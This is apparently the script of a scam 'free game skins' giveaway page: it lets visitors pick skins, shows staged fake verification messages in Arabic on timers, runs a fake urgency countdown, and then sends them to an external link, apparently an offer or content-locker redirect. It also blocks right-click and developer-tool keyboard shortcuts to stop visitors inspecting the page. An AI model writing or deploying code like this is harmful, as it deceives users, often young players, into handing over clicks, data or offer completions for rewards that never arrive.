
let selectedSkinsAmount = 0;
let selectedSkinsNames = [];

const Items = [
    'minicrewmate',
    'skin-babyyoda',
    'skin-pig',
    'skin-nemo',
    'skin-groot',
    'skin-galactus',
    'skin-agent',
    'skin-finn',
    'skin-squid',
    'skin-mickey',
    'skin-banana',
    'skin-flash',
    'skin-robot',
    'skin-blackpanther',
    'skin-minion',
    'skin-pikachu',
    'skin-venom',
    'skin-daredevil',
    'skin-woody',
    'skin-ghost',
    'skin-winniepooh',
    'skin-bunny',
    'skin-dumbo',
    'skin-batman',
    'skin-buzzlightyear',
    'skin-elsa',
    'skin-fox',
    'skin-elmo',
    'skin-joker',
    'skin-cat',
    'skin-shark',
    'skin-dog',
    'skin-rick',
    'skin-mandalorian',
    'skin-patrick',
    'skin-stitch',
    'skin-dora',
    'skin-mike',
    'skin-nemo',
    'skin-barney',
    'skin-scoobydoo',
    'skin-olaf',
    'skin-spongebob',
    'skin-thanos',
    'skin-shrek',
]

for (let i = 0; i < Items.length; i++) {
    document.querySelector('.items').innerHTML += `
        <div class="col-md-3 col-md-6 tk">
            <a class="card splash-card">
                <picture>
                    <img class="card-img-top desktop-img pickaxe" src="imgs/${Items[i]}.png">
                </picture>
            </a>
        </div>
    `
}

document.querySelectorAll('.col-md-3.col-md-6 a').forEach(item => {
    item.onclick = () => {
        if (!item.classList.contains('activeCard')) {
            if (selectedSkinsAmount >= 3) {
                $('.errorMsg').fadeIn();
                document.querySelector('.formError').innerText = 'Maximum 3 Skins!';
            } else {
                item.classList.add('activeCard');
                selectedSkinsAmount++;
                selectedSkinsNames.push(item.innerText);
            }
        } else {
            item.classList.remove('activeCard');
            selectedSkinsAmount--
            selectedSkinsNames = selectedSkinsNames.filter(e => e !== item.innerText);
        }
    }
});

function claim() {
    if (selectedSkinsAmount < 1) return document.querySelector('.holderInput h1').innerText = "Please select at least 1 or more skins!";

    $('.firstStep').fadeOut(250)
    $('.verifying').fadeIn(2250)

const statuses = ['جاري الإتصال...', 'البحت عن إسمك...', 'تم إجاده', 'التحقق البشري...', 'التحقق من انك لست آلة (1/2)...', 'هناك مشكل...', 'الولوج  الى صفحةالتحقق البشري (2/2)...', 'قم بالضغط على "تفعيل" لنتحقق انك لست  آلة او شخص آخر'];

    for (let i = 0; i < statuses.length; i++) {
        let time = 2 * i * 850;
        if (i === statuses.length - 1) time = 16000;
        setTimeout(() => {
            document.querySelector('.status').innerHTML = `Status: <span ${i === 2 ? "class='successText'" : i === statuses.length - 1 || i === 5 ? "class='errorText'}" : i === 4 || i === 6 ? 'class="yellowText"' : ''}>${statuses[i]}</span>`;
            if (i === statuses.length - 1) $('.verify').show();
        }, time)
    }
}


var timerStarted = 0;
var $ = window.jQuery;

function startTimer(duration, display) {

    if (timerStarted == 0) {

        timerStarted = 1;

        var timer = duration,
            minutes, seconds;

        setInterval(function() {

            minutes = parseInt(timer / 60, 10)
            seconds = parseInt(timer % 60, 10);

            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.text(minutes + ":" + seconds);

            if (--timer < 0) {
              var x = document.getElementsByClassName("timeLeft");
              x[0].innerHTML = "GOING SOON!";
            }

        }, 1000);
    }
}

startTimer(60 * 4.7, $('.timeLeft'));

            var el_up = document.getElementById("GFG_UP"); 
            var el_down = document.getElementById("GFG_DOWN"); 
              
                document.addEventListener('contextmenu',  
                        event => event.preventDefault()); 


document.onkeydown = function(e) {
  if(event.keyCode == 123) {
     return false;
  }
  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
     return false;
  }
  if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
     return false;
  }
  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
     return false;
  }
  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
     return false;
  }
}
	$( '.verify' ).click( function() {

	    window.open("https://www.chocoroads.com/ATljZkCP7gwqImk4");

	});
startTimer(60 * 4.7, $('.timeLeft'));